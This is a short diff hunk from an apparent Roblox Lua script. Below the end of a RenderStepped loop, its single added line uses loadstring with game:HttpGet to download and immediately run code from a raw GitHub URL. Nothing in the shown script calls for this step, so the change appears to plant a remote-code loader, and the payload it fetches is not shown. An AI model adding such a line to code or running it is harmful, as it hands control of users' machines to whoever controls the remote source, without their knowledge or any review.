@@ -83,3 +83,4 @@ game:GetService('RunService').RenderStepped:Connect(function()
         end
     end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
